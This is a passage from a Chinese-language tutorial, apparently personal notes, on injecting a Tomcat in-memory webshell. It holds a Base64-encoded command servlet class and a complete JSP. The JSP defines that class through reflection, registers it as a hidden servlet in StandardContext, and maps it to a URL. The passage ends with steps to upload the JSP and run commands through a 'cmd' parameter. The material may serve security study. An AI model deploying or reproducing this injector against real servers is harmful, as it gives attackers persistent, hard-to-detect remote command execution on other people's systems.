YQAhAHIAAgABAHQAAAAGAAEABQAGAAEAdgAAADMAAQABAAAABSq3AAGxAAAAAgB3AAAACgACAAAAEAAEABEAeAAAAAwAAQAAAAUAeQB6AAAAAQB7AHwAAgB2AAAANQAAAAIAAAABsQAAAAIAdwAAAAYAAQAAABUAeAAAABYAAgAAAAEAeQB6AAAAAAABAH0AfgABAH8AAAAEAAEAgAABAIIAgwABAHYAAAAsAAEAAQAAAAIBsAAAAAIAdwAAAAYAAQAAABkAeAAAAAwAAQAAAAIAeQB6AAAAAQCEAIUAAgB2AAACjQAEAA4AAADsLBIHuQAJAgAsEg+5ABECACy5ABQBABIYtgAaK8AAH04tEiG5ACMCADoEGQTGAL8ENgUSJ7gAKToGGQbGABMZBrYALhI0tgA2mQAGAzYFFQWZABkGvQAvWQMSOlNZBBI8U1kFGQRTpwAWBr0AL1kDEj5TWQQSQFNZBRkEUzoHuABCGQe2AEi2AEw6CLsAUlkZCLcAVBJXtgBZOgkZCbYAXZkACxkJtgBhpwAFEmQ6Ciy5ABQBADoLGQsZCrYAGhkLtgBmGQvGACYZC7YAaacAHjoMGQvGABQZC7YAaacADDoNGQwZDbYAbhkMv7EAAgC3AMMA0ABsANcA3ADfAGwAAwB3AAAAVgAVAAAAHwAIACAAEAAhABsAIgAgACMAKgAkAC8AJQAyACYAOQAnAEsAKABOACoAaQArAH4ALACLAC0AmwAuAK8ALwC3ADAAvgAxAMMAMgDQAC8A6wA0AHgAAAB6AAwAtwA0AIYAhwALADIAuQCIAIkABQA5ALIAigCLAAYAfgBtAIwAjQAHAIsAYACOAI8ACACbAFAAkACRAAkArwA8AJIAiwAKAAAA7AB5AHoAAAAAAOwAkwCUAAEAAADsAJUAlgACACAAzACXAJgAAwAqAMIAIgCLAAQAmQAAAKMACf8ATgAHBwByBwCaBwAKBwAfBwAvAQcALwAAGlIHAJz+AC4HAJwHAJ0HAFJBBwAv/wAiAAwHAHIHAJoHAAoHAB8HAC8BBwAvBwCcBwCdBwBSBwAvBwAbAAEHAGz/AA4ADQcAcgcAmgcACgcAHwcALwEHAC8HAJwHAJ0HAFIHAC8HABsHAGwAAQcAbAj/AAIABQcAcgcAmgcACgcAHwcALwAAAH8AAAAGAAIAgACfAAEAoQAzAAEAdgAAACwAAQABAAAAAgGwAAAAAgB3AAAABgABAAAAOAB4AAAADAABAAAAAgB5AHoAAAABAKIABgABAHYAAAArAAAAAQAAAAGxAAAAAgB3AAAABgABAAAAPQB4AAAADAABAAAAAQB5AHoAAAABAKMAAAACAKQ=";
    // 获取当前线程的上下文类加载器 ClassLoader
    ClassLoader loader = Thread.currentThread().getContextClassLoader();
    // 使用 Base64 解码一个Java类class文件的二进制数据的Base64编码的字符串成字节数组
    Base64.Decoder base64Decoder = Base64.getDecoder();
    byte[] decodeBytes = base64Decoder.decode(SUMMER_CMD_SERVLET_CLASS_STRING_BASE64);

    // 通过反射调用ClassLoader的defineClass方法，将字节数组转换为Class对象
    Method method = null;
    Class<?> clz = loader.getClass();
    Class<?> servletClass = null;
%>

<%
    // 在一个 while 循环中不断尝试获取该方法，如果当前类 clz 中没有找到 defineClass 方法，则继续向其父类查找，直到找到该方法或到达
    // Object 类为止
    while (method == null && clz != Object.class) {
        try {
            method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        } catch (NoSuchMethodException ex) {
            clz = clz.getSuperclass();
        }
    }
    if (method != null) {
        // 一旦找到了 defineClass 方法，代码将其设置为可访问的（即使该方法是私有的）
        method.setAccessible(true);
        // 通过反射调用该方法，将解码后的字节数组 decodeBytes 转换为一个 Class 对象并返回
        servletClass = (Class<?>) method.invoke(loader, decodeBytes, 0, decodeBytes.length);
    }
    // 获取StandardContext
    StandardContext standardCtx = null;
    ServletContext servletContext = request.getServletContext();
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    Object appContext = appContextField.get(servletContext);

    Field standardCtxField = appContext.getClass().getDeclaredField("context");
    standardCtxField.setAccessible(true);
    standardCtx = (StandardContext) standardCtxField.get(appContext);

    if (standardCtx != null) {
        // 用Wrapper对其进行封装
        org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
        newWrapper.setName("dynamicAddServletPlainClass");
        newWrapper.setLoadOnStartup(1);
        newWrapper.setServlet((Servlet) servletClass.getDeclaredConstructor().newInstance());
        newWrapper.setServletClass(servletClass.getName());

        // 添加封装后的恶意Wrapper到StandardContext的children当中
        standardCtx.addChild(newWrapper);

        // 添加ServletMapping将访问的URL和Servlet进行绑定
        standardCtx.addServletMappingDecoded("/dynamicAddServletPlainClass", "dynamicAddServletPlainClass");
        out.println("Successfully added a new servlet By Base64 Class String to StandardContext");
    } else {
        out.println("Failed to get StandardContext");
    }
%>
```

> 需要注意的是 
>
> - `<%! ...... %>` 声明脚本元素（Declaration）
>   - 用于声明类成员变量和方法。
>   - 声明的变量和方法在整个 JSP 页面中都可以使用。
>   - 这些变量和方法在 JSP 页面转换成 Servlet 类时，会被放在类的成员位置。
> - `<% ...... %>` 脚本片段（Scriptlet）
>   - 用于编写 Java 代码片段。
>   - 代码片段会被插入到 JSP 页面转换成的 Servlet 类的 `_jspService` 方法中。
>   - 这些代码片段只能在当前的请求处理过程中使用
>   - 是用于执行 Java 代码的标签，通常用于处理请求和响应。
>
> **不要直接在 `<%! ...... %>` 中编写代码片段, 只能在其中声明变量与方法, 否则编译会报错****

将此 JSP 写入/上传 到 Tomcat  的 webapps 目录下

![image-20240930160249380](http://cdn.ayusummer233.top/DailyNotes/202409301602568.png)

访问此 JSP 页面, 显示如下信息则表示恶意 Servlet 添加成功

![image-20240930160307736](http://cdn.ayusummer233.top/DailyNotes/202409301603889.png)

然后便可以尝试执行命令: `/dynamicAddServletPlainClass?cmd=pwd`

![image-20240930160405672](http://cdn.ayusummer233.top/DailyNotes/202409301604776.png)

---

